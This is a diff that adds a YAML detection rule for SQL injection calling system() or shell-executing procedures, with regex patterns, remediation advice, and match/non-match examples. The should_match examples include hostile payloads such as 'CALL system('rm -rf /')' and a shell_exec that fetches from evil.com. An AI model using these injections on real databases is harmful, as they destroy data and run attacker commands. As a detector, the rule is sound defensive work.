@@ -1,0 +1,46 @@
+version: 1.0.0
+rule_id: cmd-028
+family: CMD
+sub_family: sql_injection
+name: Detects SQL CALL system() and dangerous procedures
+description: Detects SQL CALL system() and dangerous procedures
+severity: critical
+confidence: 0.97
+patterns:
+- pattern: (?i)';?\s*CALL\s+(?:\w+\.)?system\s*\(['"]
+  flags:
+  - IGNORECASE
+  timeout: 5.0
+- pattern: (?i)CALL\s+(?:shell_exec|exec_cmd|run_command)
+  flags:
+  - IGNORECASE
+  timeout: 5.0
+- pattern: (?i)';?\s*CALL\s+\w+\.(?:system|[a-z_]+)\s*\(['"](?:rm|cat|ls|wget|whoami)
+  flags:
+  - IGNORECASE
+  timeout: 5.0
+examples:
+  should_match:
+  - 1'; CALL system('rm -rf /')--
+  - '''; CALL shell_exec(''wget evil.com'')--'
+  - admin'; CALL sys.system('whoami')--
+  should_not_match:
+  - MySQL CALL statement syntax
+  - How to call stored procedures
+  - Database procedure documentation
+metrics:
+  precision: null
+  recall: null
+  f1_score: null
+  last_evaluated: null
+mitre_attack:
+- T1059
+metadata:
+  created: '2025-11-09'
+  updated: '2025-11-09'
+  author: raxe-ce
+  legacy_rx_id: RX-CMD-0028
+rule_hash: sha256:8378eb89f6295b14e2c0079fd96166f3983e62cf5743c2009bd6ab35043bfc30
+risk_explanation: SQL injection attacks inject malicious SQL commands to manipulate database queries, enabling data theft, unauthorized modifications, or complete database compromise. Critical commands like DROP, DELETE, and TRUNCATE can cause catastrophic data loss.
+remediation_advice: Always use parameterized queries and prepared statements. Never concatenate user input into SQL commands. Implement input validation and sanitization. Use database accounts with minimal required privileges. Deploy SQL injection detection and blocking at multiple layers.
+docs_url: https://github.com/raxe-ai/raxe-ce/wiki/CMD-028-Sql-Call-System()
